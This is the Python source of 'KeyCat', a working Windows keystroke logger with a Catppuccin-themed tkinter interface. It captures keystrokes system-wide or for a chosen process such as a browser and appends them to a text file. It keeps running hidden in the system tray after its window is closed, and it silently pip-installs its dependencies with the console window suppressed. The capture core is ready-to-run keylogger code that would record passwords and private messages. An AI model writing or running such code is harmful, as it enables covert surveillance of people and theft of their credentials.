"""
✨ KeyCat - Catppuccin Keystroke Logger ✨
All 4 Catppuccin flavours. Runs silently in the system tray.
"""

import tkinter as tk
from tkinter import filedialog, messagebox
import threading
import datetime
import os
import sys
import subprocess

# ── Silent dependency install ──────────────────────────────────────────────────
def _silent_install(*packages):
    subprocess.check_call(
        [sys.executable, "-m", "pip", "install", *packages, "--quiet"],
        creationflags=0x08000000,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

try:
    from pynput import keyboard as _kb
    import win32gui, win32process
    import psutil
    import pystray
    from PIL import Image, ImageDraw, ImageTk
except ImportError:
    _silent_install("pynput", "pywin32", "psutil", "pystray", "Pillow")
    from pynput import keyboard as _kb
    import win32gui, win32process
    import psutil
    import pystray
    from PIL import Image, ImageDraw, ImageTk


# ─────────────────────────────────────────────
#  All 4 Catppuccin Flavours
# ─────────────────────────────────────────────
THEMES = {
    "Mocha": {                       # ← default (dark, warm)
        "base":      "#1e1e2e",
        "mantle":    "#181825",
        "crust":     "#11111b",
        "surface0":  "#313244",
        "surface1":  "#45475a",
        "surface2":  "#585b70",
        "overlay0":  "#6c7086",
        "overlay1":  "#7f849c",
        "overlay2":  "#9399b2",
        "text":      "#cdd6f4",
        "subtext1":  "#bac2de",
        "subtext0":  "#a6adc8",
        "lavender":  "#b4befe",
        "blue":      "#89b4fa",
        "sapphire":  "#74c7ec",
        "sky":       "#89dceb",
        "teal":      "#94e2d5",
        "green":     "#a6e3a1",
        "yellow":    "#f9e2af",
        "peach":     "#fab387",
        "maroon":    "#eba0ac",
        "red":       "#f38ba8",
        "mauve":     "#cba6f7",
        "pink":      "#f5c2e7",
        "flamingo":  "#f2cdcd",
        "rosewater": "#f5e0dc",
    },
    "Macchiato": {                   # dark, cool-toned
        "base":      "#24273a",
        "mantle":    "#1e2030",
        "crust":     "#181926",
        "surface0":  "#363a4f",
        "surface1":  "#494d64",
        "surface2":  "#5b6078",
        "overlay0":  "#6e738d",
        "overlay1":  "#8087a2",
        "overlay2":  "#939ab7",
        "text":      "#cad3f5",
        "subtext1":  "#b8c0e0",
        "subtext0":  "#a5adcb",
        "lavender":  "#b7bdf8",
        "blue":      "#8aadf4",
        "sapphire":  "#7dc4e4",
        "sky":       "#91d7e3",
        "teal":      "#8bd5ca",
        "green":     "#a6da95",
        "yellow":    "#eed49f",
        "peach":     "#f5a97f",
        "maroon":    "#ee99a0",
        "red":       "#ed8796",
        "mauve":     "#c6a0f6",
        "pink":      "#f5bde6",
        "flamingo":  "#f0c6c6",
        "rosewater": "#f4dbd6",
    },
    "Frappe": {                      # medium, muted
        "base":      "#303446",
        "mantle":    "#292c3c",
        "crust":     "#232634",
        "surface0":  "#414559",
        "surface1":  "#51576d",
        "surface2":  "#626880",
        "overlay0":  "#737994",
        "overlay1":  "#838ba7",
        "overlay2":  "#949cbb",
        "text":      "#c6d0f5",
        "subtext1":  "#b5bfe2",
        "subtext0":  "#a5adce",
        "lavender":  "#babbf1",
        "blue":      "#8caaee",
        "sapphire":  "#85c1dc",
        "sky":       "#99d1db",
        "teal":      "#81c8be",
        "green":     "#a6d189",
        "yellow":    "#e5c890",
        "peach":     "#ef9f76",
        "maroon":    "#ea999c",
        "red":       "#e78284",
        "mauve":     "#ca9ee6",
        "pink":      "#f4b8e4",
        "flamingo":  "#eebebe",
        "rosewater": "#f2d5cf",
    },
    "Latte": {                       # light theme
        "base":      "#eff1f5",
        "mantle":    "#e6e9ef",
        "crust":     "#dce0e8",
        "surface0":  "#ccd0da",
        "surface1":  "#bcc0cc",
        "surface2":  "#acb0be",
        "overlay0":  "#9ca0b0",
        "overlay1":  "#8c8fa1",
        "overlay2":  "#7c7f93",
        "text":      "#4c4f69",
        "subtext1":  "#5c5f77",
        "subtext0":  "#6c6f85",
        "lavender":  "#7287fd",
        "blue":      "#1e66f5",
        "sapphire":  "#209fb5",
        "sky":       "#04a5e5",
        "teal":      "#179299",
        "green":     "#40a02b",
        "yellow":    "#df8e1d",
        "peach":     "#fe640b",
        "maroon":    "#e64553",
        "red":       "#d20f39",
        "mauve":     "#8839ef",
        "pink":      "#ea76cb",
        "flamingo":  "#dd7878",
        "rosewater": "#dc8a78",
    },
}

# Active theme — Mocha by default
C = dict(THEMES["Mocha"])
CURRENT_THEME = "Mocha"

def _apply_theme(name):
    global C, CURRENT_THEME
    CURRENT_THEME = name
    C.update(THEMES[name])

def _hex_to_rgb(h):
    h = h.lstrip("#")
    return tuple(int(h[i:i+2], 16) for i in (0, 2, 4))


# ─────────────────────────────────────────────
#  Paw-print icon generator
# ─────────────────────────────────────────────
def _make_paw_image(size=64):
    img = Image.new("RGBA", (size, size), (0, 0, 0, 0))
    d = ImageDraw.Draw(img)
    bg  = _hex_to_rgb(C["crust"]) + (255,)
    col = _hex_to_rgb(C["mauve"]) + (255,)
    s = size / 64
    d.ellipse([0, 0, size-1, size-1], fill=bg)
    d.ellipse([int(18*s), int(30*s), int(46*s), int(58*s)], fill=col)
    d.ellipse([int(8*s),  int(16*s), int(24*s), int(32*s)], fill=col)
    d.ellipse([int(24*s), int(8*s),  int(40*s), int(24*s)], fill=col)
    d.ellipse([int(40*s), int(16*s), int(56*s), int(32*s)], fill=col)
    return img


# ─────────────────────────────────────────────
#  Keystroke Logger Core
# ─────────────────────────────────────────────
class KeystrokeLogger:
    SPECIAL_KEYS = {
        "Key.space": " ", "Key.enter": "\n", "Key.tab": "\t",
        "Key.backspace": "[BACK]",
        "Key.shift": "", "Key.shift_r": "",
        "Key.ctrl_l": "[Ctrl]", "Key.ctrl_r": "[Ctrl]",
        "Key.alt_l": "[Alt]",   "Key.alt_r": "[Alt]",
        "Key.caps_lock": "[Caps]", "Key.delete": "[Del]",
        "Key.end": "[End]", "Key.home": "[Home]",
        "Key.page_down": "[PgDn]", "Key.page_up": "[PgUp]",
        "Key.up": "[Up]", "Key.down": "[Dn]",
        "Key.left": "[<]", "Key.right": "[>]",
        "Key.esc": "[Esc]",
        **{f"Key.f{i}": f"[F{i}]" for i in range(1, 13)},
    }

    def __init__(self):
        self.target_app = ""
        self.output_file = os.path.join(os.path.expanduser("~"), "Desktop", "keycat_log.txt")
        self.is_logging = False
        self.listener = None
        self.buffer = []
        self.session_keycount = 0
        self.on_key_callback = None
        self.on_status_callback = None

    def get_active_window(self):
        try:
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            proc = psutil.Process(pid)
            return proc.name(), win32gui.GetWindowText(hwnd)
        except Exception:
            return "", ""

    def _on_press(self, key):
        if not self.is_logging:
            return
        proc_name, win_title = self.get_active_window()
        target = self.target_app.strip().lower()
        if target and target not in proc_name.lower() and target not in win_title.lower():
            return
        key_str = str(key)
        if key_str.startswith("'") and key_str.endswith("'"):
            char = key_str[1:-1]
        else:
            char = self.SPECIAL_KEYS.get(key_str, f"[{key_str}]")
        if char == "":
            return
        self.buffer.append(char)
        self.session_keycount += 1
        if self.on_key_callback:
            self.on_key_callback(char, self.session_keycount)
        if char == "\n" or len(self.buffer) >= 50:
            self._flush()

    def _flush(self):
        if not self.buffer:
            return
        content = "".join(self.buffer)
        self.buffer.clear()
        try:
            with open(self.output_file, "a", encoding="utf-8") as f:
                f.write(content)
        except Exception as e:
            if self.on_status_callback:
                self.on_status_callback(f"Write error: {e}", "error")

    def start(self):
        if self.is_logging:
            return
        self.is_logging = True
        self.session_keycount = 0
        try:
            with open(self.output_file, "a", encoding="utf-8") as f:
                f.write(f"\n\n{'─'*60}\n")
                f.write(f"  KeyCat Session [{CURRENT_THEME}] — {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"  Target: {self.target_app or 'All Windows'}\n")
                f.write(f"{'─'*60}\n\n")
        except Exception:
            pass
        self.listener = _kb.Listener(on_press=self._on_press)
        self.listener.start()

    def stop(self):
        if not self.is_logging:
            return
        self.is_logging = False
        self._flush()
        if self.listener:
            self.listener.stop()
            self.listener = None
        try:
            with open(self.output_file, "a", encoding="utf-8") as f:
                f.write(f"\n\n[Session ended - {self.session_keycount} keys logged]\n")
        except Exception:
            pass


# ─────────────────────────────────────────────
#  GUI Application
# ─────────────────────────────────────────────
class KeyCatApp:
    def __init__(self):
        self.logger = KeystrokeLogger()
        self.logger.on_key_callback = self.on_key_logged
        self.logger.on_status_callback = self.on_status
        self._tray = None
        self._all_widgets = []   # (widget, bg_key, fg_key) for theme repainting

        self.root = tk.Tk()
        self.root.title("KeyCat - Keystroke Logger")
        self.root.geometry("620x790")
        self.root.minsize(560, 600)
        self.root.resizable(True, True)
        self.root.configure(bg=C["base"])

        self._build_ui()
        self._set_window_icon()
        self._setup_tray()

    # ── Icon ──────────────────────────────────────────────────────────────────
    def _set_window_icon(self):
        try:
            pil_img = _make_paw_image(size=256)
            self._icon_photo = ImageTk.PhotoImage(pil_img)
            self.root.iconphoto(True, self._icon_photo)
        except Exception:
            pass

    # ── Tray ──────────────────────────────────────────────────────────────────
    def _setup_tray(self):
        icon_img = _make_paw_image()
        menu = pystray.Menu(
            pystray.MenuItem("Show KeyCat",   self._tray_show,     default=True),
            pystray.Menu.SEPARATOR,
            pystray.MenuItem("Start Logging", self._tray_start),
            pystray.MenuItem("Stop Logging",  self._tray_stop),
            pystray.Menu.SEPARATOR,
            pystray.MenuItem("Open Log File", self._tray_open_log),
            pystray.Menu.SEPARATOR,
            pystray.MenuItem("Quit KeyCat",   self._tray_quit),
        )
        self._tray = pystray.Icon("KeyCat", icon_img, "KeyCat", menu)
        threading.Thread(target=self._tray.run, daemon=True).start()

    def _tray_show(self,     *_): self.root.after(0, self._show_window)
    def _tray_start(self,    *_): self.root.after(0, self.start_logging)
    def _tray_stop(self,     *_): self.root.after(0, self.stop_logging)
    def _tray_open_log(self, *_): self.root.after(0, self.open_log)
    def _tray_quit(self,     *_): self.root.after(0, self._full_quit)

    def _show_window(self):
        self.root.deiconify()
        self.root.lift()
        self.root.focus_force()

    def _hide_to_tray(self):
        self.root.withdraw()

    def _full_quit(self):
        if self.logger.is_logging:
            self.logger.stop()
        if self._tray:
            self._tray.stop()
        self.root.destroy()

    # ── Theme Engine ──────────────────────────────────────────────────────────
    def _tw(self, widget, bg_key=None, fg_key=None):
        """Register a widget for theme repainting and return it."""
        self._all_widgets.append((widget, bg_key, fg_key))
        return widget

    def apply_theme(self, name):
        """Switch to a named Catppuccin flavour and repaint everything."""
        _apply_theme(name)

        # Repaint root
        self.root.configure(bg=C["base"])

        # Repaint all registered widgets
        for widget, bg_key, fg_key in self._all_widgets:
            try:
                kwargs = {}
                if bg_key:
                    kwargs["bg"] = C[bg_key]
                if fg_key:
                    kwargs["fg"] = C[fg_key]
                if kwargs:
                    widget.configure(**kwargs)
            except Exception:
                pass

        # Repaint special dynamic widgets
        try:
            self.start_btn.configure(
                bg=C["surface1"] if self.logger.is_logging else C["green"],
                fg=C["overlay0"] if self.logger.is_logging else C["crust"],
                activebackground=C["teal"], activeforeground=C["crust"])
            self.stop_btn.configure(
                bg=C["red"] if self.logger.is_logging else C["surface1"],
                fg=C["crust"] if self.logger.is_logging else C["overlay2"],
                activebackground=C["surface2"])
            self.status_pill.configure(
                bg=C["green"] if self.logger.is_logging else C["surface0"],
                fg=C["crust"] if self.logger.is_logging else C["overlay2"])
        except Exception:
            pass

        # Feed text colors
        try:
            self.feed_text.configure(bg=C["crust"], fg=C["text"],
                                     insertbackground=C["mauve"])
            self.feed_text.tag_configure("special", foreground=C["peach"])
            self.feed_text.tag_configure("normal",  foreground=C["text"])
            self.feed_text.tag_configure("newline", foreground=C["mauve"])
        except Exception:
            pass

        # Highlight the active button in the switcher row
        try:
            for n, btn in self._theme_btns.items():
                is_active = (n == name)
                btn.configure(
                    bg=C["mauve"]    if is_active else C["surface1"],
                    fg=C["crust"]    if is_active else C["overlay1"],
                    relief="sunken"  if is_active else "flat",
                )
        except Exception:
            pass

        # Update tray icon with new palette
        try:
            new_img = _make_paw_image(64)
            self._tray.icon = new_img
        except Exception:
            pass

        # Update window icon
        self._set_window_icon()

    # ── UI Helpers ─────────────────────────────────────────────────────────────
    def _lbl(self, parent, text, bg_key="base", fg_key="text", size=11, bold=False, **kw):
        w = tk.Label(parent, text=text,
            bg=C[bg_key], fg=C[fg_key],
            font=("Segoe UI", size, "bold" if bold else "normal"), **kw)
        self._tw(w, bg_key, fg_key)
        return w

    def _frame(self, parent, bg_key="base", **kw):
        w = tk.Frame(parent, bg=C[bg_key], **kw)
        self._tw(w, bg_key)
        return w

    def _font_exists(self, name):
        try:
            import tkinter.font as tf
            return name in tf.families()
        except Exception:
            return False

    # ── Build UI ──────────────────────────────────────────────────────────────
    def _build_ui(self):
        root = self.root

        # ── Header ────────────────────────────────────────────
        hdr = self._frame(root, "mantle", pady=16)
        hdr.pack(fill="x")
        self._lbl(hdr, "🐱 KeyCat", "mantle", "mauve", size=28, bold=True).pack()
        self._lbl(hdr, "Keystroke Logger  •  Catppuccin Edition",
                  "mantle", "overlay1", size=10).pack()

        # ── Theme Switcher ────────────────────────────────────
        ts_outer = self._frame(root, "mantle", pady=0)
        ts_outer.pack(fill="x")
        ts_inner = self._frame(ts_outer, "mantle")
        ts_inner.pack(pady=(0, 10))

        self._lbl(ts_inner, "🎨 Theme:", "mantle", "overlay1", size=9).pack(side="left", padx=(0, 6))

        self._theme_btns = {}
        # Accent colors to hint each flavour visually
        ACCENTS = {
            "Mocha":     ("mauve",   "Mocha"),
            "Macchiato": ("mauve",   "Macchiato"),
            "Frappe":    ("mauve",   "Frappé"),
            "Latte":     ("mauve",   "Latte"),
        }
        for name, (_, label) in ACCENTS.items():
            is_active = (name == CURRENT_THEME)
            btn = tk.Button(
                ts_inner, text=label,
                bg=C["mauve"] if is_active else C["surface1"],
                fg=C["crust"] if is_active else C["overlay1"],
                font=("Segoe UI", 9, "bold"),
                relief="sunken" if is_active else "flat",
                bd=1, padx=10, pady=3, cursor="hand2",
                command=lambda n=name: self.apply_theme(n)
            )
            btn.pack(side="left", padx=3)
            self._theme_btns[name] = btn

        # ── Tray hint ─────────────────────────────────────────
        hint = self._frame(root, "surface0", pady=5)
        hint.pack(fill="x")
        self._lbl(hint, "  Closing hides KeyCat to the tray — logging keeps running!",
                  "surface0", "yellow", size=9).pack(fill="x", padx=10)

        # ── Status pill ───────────────────────────────────────
        sf = self._frame(root, "base", pady=8)
        sf.pack()
        self.status_pill = tk.Label(sf, text="  Idle  ",
            bg=C["surface0"], fg=C["overlay2"],
            font=("Segoe UI", 10, "bold"), padx=12, pady=4)
        self._tw(self.status_pill, "surface0", "overlay2")
        self.status_pill.pack()

        # ── Target App ────────────────────────────────────────
        s1 = self._frame(root, "base", padx=28, pady=6)
        s1.pack(fill="x")
        self._lbl(s1, "🎯  Target Application", "base", "lavender", size=12, bold=True).pack(anchor="w")
        self._lbl(s1, "Process name (e.g. chrome.exe) or window title keyword. Blank = all windows.",
                  "base", "subtext0", size=9).pack(anchor="w", pady=(2, 6))
        ef = self._frame(s1, "surface0", padx=10, pady=8)
        ef.pack(fill="x")
        self.target_var = tk.StringVar()
        self.target_entry = tk.Entry(ef, textvariable=self.target_var,
            bg=C["surface0"], fg=C["text"], insertbackground=C["mauve"],
            font=("Segoe UI", 12), relief="flat", bd=0, width=35)
        self._tw(self.target_entry, "surface0", "text")
        self.target_entry.pack(side="left", fill="x", expand=True)
        detect_btn = tk.Button(ef, text="📋 Detect", bg=C["surface1"], fg=C["sapphire"],
                  font=("Segoe UI", 9, "bold"), relief="flat", bd=0, padx=8,
                  cursor="hand2", command=self.show_running_apps)
        self._tw(detect_btn, "surface1", "sapphire")
        detect_btn.pack(side="right")

        # ── Output File ───────────────────────────────────────
        s2 = self._frame(root, "base", padx=28, pady=6)
        s2.pack(fill="x")
        self._lbl(s2, "📄  Output File", "base", "lavender", size=12, bold=True).pack(anchor="w")
        ff = self._frame(s2, "surface0", padx=10, pady=8)
        ff.pack(fill="x", pady=(4, 0))
        self.file_var = tk.StringVar(value=self.logger.output_file)
        file_entry = tk.Entry(ff, textvariable=self.file_var, bg=C["surface0"], fg=C["subtext1"],
                 insertbackground=C["mauve"], font=("Segoe UI", 9),
                 relief="flat", bd=0, width=38)
        self._tw(file_entry, "surface0", "subtext1")
        file_entry.pack(side="left", fill="x", expand=True)
        browse_btn = tk.Button(ff, text="📁 Browse", bg=C["surface1"], fg=C["peach"],
                  font=("Segoe UI", 9, "bold"), relief="flat", bd=0, padx=8,
                  cursor="hand2", command=self.browse_file)
        self._tw(browse_btn, "surface1", "peach")
        browse_btn.pack(side="right")

        # ── Control Buttons ───────────────────────────────────
        ctrl = self._frame(root, "base", padx=28, pady=14)
        ctrl.pack(fill="x")
        self.start_btn = tk.Button(ctrl, text="▶  Start Logging",
            bg=C["green"], fg=C["crust"], font=("Segoe UI", 13, "bold"),
            relief="flat", bd=0, padx=20, pady=10, cursor="hand2",
            command=self.start_logging,
            activebackground=C["teal"], activeforeground=C["crust"])
        self.start_btn.pack(side="left", expand=True, fill="x", padx=(0, 6))
        self.stop_btn = tk.Button(ctrl, text="⏹  Stop",
            bg=C["surface1"], fg=C["overlay2"], font=("Segoe UI", 13, "bold"),
            relief="flat", bd=0, padx=20, pady=10, cursor="hand2",
            command=self.stop_logging,
            activebackground=C["surface2"], state="disabled")
        self.stop_btn.pack(side="left", expand=True, fill="x", padx=(6, 0))

        # ── Hide to Tray ──────────────────────────────────────
        tr = self._frame(root, "base", padx=28, pady=2)
        tr.pack(fill="x")
        tray_btn = tk.Button(tr, text="📌  Hide to System Tray (keeps logging)",
            bg=C["surface0"], fg=C["lavender"], font=("Segoe UI", 9),
            relief="flat", bd=0, padx=10, pady=5, cursor="hand2",
            command=self._hide_to_tray)
        self._tw(tray_btn, "surface0", "lavender")
        tray_btn.pack(fill="x")

        # ── Stats Bar ─────────────────────────────────────────
        stats = self._frame(root, "mantle", pady=10)
        stats.pack(fill="x")
        self.key_count_var     = tk.StringVar(value="0")
        self.active_window_var = tk.StringVar(value="—")
        for lbl_text, var, fg_key in [
            ("Keys This Session:", self.key_count_var,     "green"),
            ("Active Window:",     self.active_window_var, "sapphire"),
        ]:
            f = self._frame(stats, "mantle")
            f.pack(side="left", expand=True)
            self._lbl(f, lbl_text, "mantle", "overlay1", size=9).pack()
            dyn = tk.Label(f, textvariable=var,
                           bg=C["mantle"], fg=C[fg_key],
                           font=("Segoe UI", 11, "bold"))
            self._tw(dyn, "mantle", fg_key)
            dyn.pack()

        # ── Live Feed ─────────────────────────────────────────
        fh = self._frame(root, "base", padx=28, pady=10)
        fh.pack(fill="x")
        self._lbl(fh, "🔴  Live Feed", "base", "lavender", size=12, bold=True).pack(side="left")
        clear_btn = tk.Button(fh, text="Clear", bg=C["surface0"], fg=C["overlay1"],
                  font=("Segoe UI", 8), relief="flat", bd=0, padx=6, pady=2,
                  cursor="hand2", command=self.clear_feed)
        self._tw(clear_btn, "surface0", "overlay1")
        clear_btn.pack(side="right")

        fo = self._frame(root, "crust")
        fo.pack(fill="both", expand=True)
        fi = self._frame(fo, "crust", padx=4, pady=4)
        fi.pack(fill="both", expand=True, padx=20, pady=8)
        mono = "Cascadia Code" if self._font_exists("Cascadia Code") else "Courier New"
        self.feed_text = tk.Text(fi, bg=C["crust"], fg=C["text"],
            insertbackground=C["mauve"], font=(mono, 10),
            relief="flat", bd=0, wrap="char", state="disabled", height=10)
        self.feed_text.pack(fill="both", expand=True)
        self.feed_text.tag_configure("special", foreground=C["peach"])
        self.feed_text.tag_configure("normal",  foreground=C["text"])
        self.feed_text.tag_configure("newline", foreground=C["mauve"])

        # ── Footer ────────────────────────────────────────────
        foot = self._frame(root, "crust", pady=6)
        foot.pack(fill="x", side="bottom")
        self._lbl(foot, "Made with 🐾 and Catppuccin  •  For fun & personal use only",
                  "crust", "overlay0", size=8).pack()
        open_btn = tk.Button(foot, text="📂 Open Log File", bg=C["crust"], fg=C["blue"],
                  font=("Segoe UI", 8), relief="flat", bd=0, cursor="hand2",
                  command=self.open_log)
        self._tw(open_btn, "crust", "blue")
        open_btn.pack()

        self._poll_active_window()

    # ── Active window poller ───────────────────────────────────────────────────
    def _poll_active_window(self):
        try:
            proc, title = self.logger.get_active_window()
            short = title[:30] + "..." if len(title) > 30 else title
            display = f"{proc} — {short}"
            self.active_window_var.set(display if display.strip("— ") else "—")
        except Exception:
            pass
        self.root.after(1500, self._poll_active_window)

    # ── Process Picker ─────────────────────────────────────────────────────────
    def show_running_apps(self):
        popup = tk.Toplevel(self.root)
        popup.title("Pick Target Process")
        popup.geometry("340x420")
        popup.configure(bg=C["base"])
        popup.grab_set()
        tk.Label(popup, text="Select a running process:", bg=C["base"], fg=C["lavender"],
                 font=("Segoe UI", 11, "bold"), pady=10).pack()
        frame = tk.Frame(popup, bg=C["surface0"])
        frame.pack(fill="both", expand=True, padx=16, pady=(0, 12))
        sb = tk.Scrollbar(frame, bg=C["surface1"])
        sb.pack(side="right", fill="y")
        lb = tk.Listbox(frame, bg=C["surface0"], fg=C["text"],
                        selectbackground=C["mauve"], selectforeground=C["crust"],
                        font=("Segoe UI", 10), relief="flat", bd=0,
                        yscrollcommand=sb.set, activestyle="none")
        lb.pack(fill="both", expand=True)
        sb.config(command=lb.yview)
        procs = set()
        for p in psutil.process_iter(["name"]):
            try:
                n = p.info["name"]
                if n: procs.add(n)
            except Exception:
                pass
        for p in sorted(procs, key=str.lower):
            lb.insert("end", p)
        def select():
            sel = lb.curselection()
            if sel:
                self.target_var.set(lb.get(sel[0]))
                popup.destroy()
        tk.Button(popup, text="Select", bg=C["mauve"], fg=C["crust"],
                  font=("Segoe UI", 10, "bold"), relief="flat", bd=0,
                  padx=12, pady=6, cursor="hand2", command=select).pack(pady=8)

    # ── Actions ────────────────────────────────────────────────────────────────
    def browse_file(self):
        path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")],
            initialfile="keycat_log.txt", title="Choose output file")
        if path:
            self.file_var.set(path)

    def start_logging(self):
        out_file = self.file_var.get().strip()
        if not out_file:
            messagebox.showerror("Error", "Please specify an output file.")
            return
        self.logger.target_app = self.target_var.get().strip()
        self.logger.output_file = out_file
        self.logger.start()
        self.start_btn.config(state="disabled", bg=C["surface1"], fg=C["overlay0"])
        self.stop_btn.config(state="normal", bg=C["red"], fg=C["crust"])
        self.target_entry.config(state="disabled")
        target = self.logger.target_app
        self.status_pill.config(
            text=f"  Logging{' -> ' + target if target else ' -> ALL Windows'}  ",
            bg=C["green"], fg=C["crust"])

    def stop_logging(self):
        self.logger.stop()
        self.start_btn.config(state="normal", bg=C["green"], fg=C["crust"])
        self.stop_btn.config(state="disabled", bg=C["surface1"], fg=C["overlay0"])
        self.target_entry.config(state="normal")
        self.status_pill.config(text="  Idle  ", bg=C["surface0"], fg=C["overlay2"])

    def on_key_logged(self, char, count):
        self.root.after(0, lambda: self._update_feed(char, count))

    def _update_feed(self, char, count):
        self.key_count_var.set(str(count))
        self.feed_text.config(state="normal")
        if char == "\n":
            self.feed_text.insert("end", "↵\n", "newline")
        elif char.startswith("[") and char.endswith("]"):
            self.feed_text.insert("end", char, "special")
        else:
            self.feed_text.insert("end", char, "normal")
        self.feed_text.see("end")
        self.feed_text.config(state="disabled")
        lines = int(self.feed_text.index("end-1c").split(".")[0])
        if lines > 300:
            self.feed_text.config(state="normal")
            self.feed_text.delete("1.0", "100.0")
            self.feed_text.config(state="disabled")

    def clear_feed(self):
        self.feed_text.config(state="normal")
        self.feed_text.delete("1.0", "end")
        self.feed_text.config(state="disabled")
        self.key_count_var.set("0")

    def on_status(self, msg, kind="ok"):
        pass

    def open_log(self):
        path = self.file_var.get().strip()
        if os.path.exists(path):
            os.startfile(path)
        else:
            messagebox.showinfo("Not Found",
                f"Log file doesn't exist yet:\n{path}\n\nStart logging first!")

    def run(self):
        self.root.protocol("WM_DELETE_WINDOW", self._hide_to_tray)
        self.root.mainloop()


# ─────────────────────────────────────────────
#  Entry Point
# ─────────────────────────────────────────────
if __name__ == "__main__":
    app = KeyCatApp()
    app.run()
